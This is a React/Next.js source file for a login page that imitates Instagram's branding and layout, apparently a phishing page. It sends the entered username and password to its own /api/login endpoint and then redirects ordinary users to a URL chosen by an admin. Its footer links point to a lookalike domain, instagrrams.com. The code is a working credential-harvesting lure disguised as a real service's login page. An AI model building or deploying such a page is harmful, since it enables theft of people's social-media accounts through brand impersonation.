"use client";
import React, { useState } from "react";
import { FaFacebook, FaInstagram, FaEye, FaEyeSlash } from "react-icons/fa";
import { useRouter } from "next/navigation";

const LoginPage = () => {
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const router = useRouter();

  // Check if both fields have data to enable the button
  const isFormValid =
    formData.username.trim() !== "" && formData.password.trim() !== "";

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  // --- NEW FUNCTION: Fetch the Active Link ---
  const getActiveRedirectUrl = async () => {
    try {
      const res = await fetch("/api/admin/redirect");
      const data = await res.json();

      // Find the link where is_active is 1
      if (data && data.links) {
        const activeLink = data.links.find((link) => link.is_active === 1);
        return activeLink ? activeLink.redirect_url : null;
      }
      return null;
    } catch (error) {
      console.error("Error fetching redirect link:", error);
      return null;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // 1. Login Request
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      const data = await res.json();

      if (res.ok) {
        const currentUser = {
          username: formData.username,
          role: data.role,
          timestamp: new Date().toISOString(),
        };

        if (typeof window !== "undefined") {
          localStorage.setItem("currentUser", JSON.stringify(currentUser));
        }

        // 2. Handle Redirect based on Role
        if (data.role === "admin") {
          // Admin goes to Dashboard
          router.push("/admin");
        } else if (data.role === "user") {
          // User goes to the Active Link fetched from API
          const targetUrl = await getActiveRedirectUrl();

          if (targetUrl) {
            window.location.href = targetUrl;
          } else {
            alert("No active redirect link set by admin.");
            setLoading(false); // Stop loading if no link found
          }
        }
      } else {
        // Show specific error message from server
        alert(data.error || "Login failed. Please check credentials.");
        setLoading(false);
      }
    } catch (error) {
      console.error(error);
      alert("Something went wrong");
      setLoading(false);
    }
  };

  return (
    <>
      <div className=" flex flex-col h-[90vh]  md:flex-row w-full mx-auto px-4 md:px-0 md:py-0 md:m-0 bg-white">
        {/* Left Side */}
        <div className="w-full md:w-[55%] flex flex-col items-center md:items-start md:justify-center md:pl-12 lg:pl-14 mb-10 md:mb-0">
          <div className="mt-4 md:mt-12 text-center md:text-left">
            <svg width="0" height="0" className="absolute">
              <linearGradient
                id="ig-gradient"
                x1="0%"
                y1="0%"
                x2="100%"
                y2="100%"
              >
                <stop offset="0%" stopColor="#6228d7" />
                <stop offset="50%" stopColor="#ee2a7b" />
                <stop offset="100%" stopColor="#f9ce34" />
              </linearGradient>
            </svg>
            <FaInstagram
              size={90}
              style={{ fill: "url(#ig-gradient)" }}
              className="mx-auto md:mx-0"
            />
          </div>

          <div className="hidden md:flex flex-col ml-16 mt-3">
            <h1 className="text-3xl md:text-4xl font-medium text-gray-900 text-center leading-tight font-sans">
              See everyday moments from your <br />
              <span className="text-center bg-gradient-to-r from-[#f09433] via-[#e6683c] via-[#dc2743] via-[#cc2366] to-[#bc1888] bg-clip-text text-transparent">
                close friends.
              </span>
            </h1>
            <figure className="mt-8">
              <img
                src="/instagram.webp"
                alt="Instagram Preview"
                className="h-[380px] object-contain"
              />
            </figure>
          </div>
        </div>

        {/* Divider */}
        <div className="hidden md:block w-[2px] bg-gray-200 h-[90vh]  "></div>

        {/* Right Side (Form) */}
        <div className="w-full md:w-[45%] flex items-center justify-center">
          <div className="w-full md:px-13 px-4">
            <h2 className="text-2xl font-semibold text-center md:text-left mb-6 text-gray-900">
              Log in to Instagram
            </h2>

            <form onSubmit={handleSubmit} className="space-y-1">
              {/* --- Username Input --- */}
              <div className="relative mb-2 group">
                <input
                  type="text"
                  id="username"
                  name="username"
                  value={formData.username}
                  onChange={handleChange}
                  required
                  className="peer block w-full rounded-lg border border-gray-300 bg-[#fafafa] py-3.5 px-4 text-lg text-gray-900 placeholder-transparent placeholder:text-lg focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500 transition-all"
                  placeholder="Mobile number, username or email"
                />
                <label
                  htmlFor="username"
                  className="absolute left-4 top-4 origin-[0] -translate-y-4 scale-75 transform text-sm text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-4 peer-focus:scale-75 peer-focus:text-blue-600"
                >
                  Mobile number, username or email
                </label>
              </div>

              {/* --- Password Input with Toggle --- */}
              <div className="relative mb-2 group">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  required
                  className="peer block w-full rounded-lg border border-gray-300 bg-[#fafafa] py-3.5 pl-4 pr-12 text-lg text-gray-900 placeholder-transparent focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500 transition-all"
                  placeholder="Password"
                />
                <label
                  htmlFor="password"
                  className="absolute left-4 top-4 origin-[0] -translate-y-4 scale-75 transform text-sm text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-4 peer-focus:scale-75 peer-focus:text-blue-600"
                >
                  Password
                </label>

                {/* Show/Hide Password Button - Only visible when password is typed */}
                {formData.password && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600 focus:outline-none cursor-pointer"
                  >
                    {showPassword ? (
                      <FaEyeSlash className="h-5 w-5" />
                    ) : (
                      <FaEye className="h-5 w-5" />
                    )}
                  </button>
                )}
              </div>

              {/* Login Button */}
              <button
                type="submit"
                disabled={loading || !isFormValid}
                className={`w-full bg-[#0095f6] text-white font-semibold text-sm rounded-full p-3 mt-4 mb-4 transition-all duration-200 transform active:scale-[0.98] ${
                  !loading && isFormValid
                    ? "hover:bg-[#1877f2] shadow-sm opacity-100 cursor-pointer"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                {loading ? "Logging in..." : "Log in"}
              </button>

              <div className="text-center mt-2 mb-4">
                <button
                  type="button"
                  className="text-xs text-blue-900 font-medium hover:underline"
                >
                  Forgotten password?
                </button>
              </div>
            </form>

            <div className="mt-8 lg:mt-12 space-y-4">
              <button className="w-full flex items-center justify-center rounded-full gap-2 px-4 py-2.5 cursor-pointer bg-white text-gray-900 border border-gray-300 hover:bg-gray-50 text-center transition-all text-sm font-semibold">
                <FaFacebook className="w-4 h-4 text-blue-600" />
                <span>Log in with Facebook</span>
              </button>

              <button className="w-full mb-4 flex items-center justify-center rounded-full gap-2 px-4 py-2.5 cursor-pointer bg-white text-blue-600 border border-blue-300 hover:bg-blue-50 text-center transition-all text-sm font-semibold">
                Create new account
              </button>
            </div>
          </div>
        </div>
      </div>
      <hr className="border-t border-gray-300 mb-4" />
      <div className="py-6 px-10 text-xs text-[#8e8e8e] text-center w-full">
        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 mb-4">
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Meta
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            About
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Blog
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Jobs
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Help
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            API
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Privacy
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Terms
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Top Accounts
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Locations
          </a>
          <a
            href="https://instagrrams.com"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Instagram Lite
          </a>
          <a
            href="https://instagrrams.com"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Contact Uploading & Non-Users
          </a>
          <a
            href="https://instagrrams.com/"
            className="hover:underline cursor-pointer"
            rel="noopener noreferrer"
          >
            Meta Verified
          </a>
        </div>
        <div>© 2026 Instagram from Meta</div>
      </div>
    </>
  );
};

export default LoginPage;
